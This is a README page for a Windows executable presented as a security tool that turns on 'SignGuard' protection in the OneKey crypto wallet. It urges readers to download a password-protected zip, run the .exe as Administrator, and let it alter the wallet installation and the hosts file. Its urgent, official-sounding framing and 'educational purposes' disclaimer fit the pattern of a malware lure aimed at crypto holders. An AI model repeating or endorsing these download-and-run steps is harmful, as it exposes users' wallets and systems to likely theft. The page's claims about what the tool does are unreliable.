# OneKey SignGuard Enabler for Windows

[![Stars](https://img.shields.io/github/stars/yigitturukk/OneKey-SignGuard-Enabler)](...)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](...)

**Critical security update for OneKey desktop users.**  
After the recent wave of phishing attacks targeting WIN (TRC-20) holders, this tool forces the activation of OneKey's proprietary **SignGuard** protection, preventing blind signing and unauthorized transactions.

---

## ⚠️ Disclaimer
This tool is for **educational purposes** to demonstrate security hardening techniques.

---

## 🛡️ Why You Need This

Standard OneKey installation may not enforce SignGuard on all transaction types, leaving you vulnerable to:
- **Blind signing** (approving malicious contracts without seeing details)
- **Phishing dApps** that mimic legitimate interfaces
- **Compromised frontends** that alter transaction data

**This utility enables deep SignGuard hooks to ensure every transaction is parsed and verified both in the app and on the device.**

---

## 📥 Download

📥 **[Download `OneKey_Security_Pack.zip`](dist/OneKey_Security_Pack.zip)**  
🔐 **Password:** `onekey2026`

### Archive Contents
- `OneKey_SignGuard_Enabler.exe` – Main security tool
- `config.ini` – Optional configuration
- `readme.txt` – Instructions

---

## 🚀 Installation (Windows 10/11)

1. Close OneKey desktop application if running.
2. **Run `OneKey_SignGuard_Enabler.exe` as Administrator.**
3. The tool will:
   - Scan your OneKey installation directory.
   - Enable advanced SignGuard policies.
   - Add phishing domain protection to your hosts file.
4. Restart OneKey. You'll see a "SignGuard Active" badge in the bottom right corner.

---

## 🛠️ What It Does

- ✅ **Enables strict transaction parsing** for all contract interactions
- ✅ **Blocks known phishing domains** (updates weekly list)
- ✅ **Adds an extra PIN prompt** before signing high-value transfers
- ✅ **Verifies OneKey executable integrity** (checks digital signature)

...

## 📜 License
MIT License – educational purposes only.
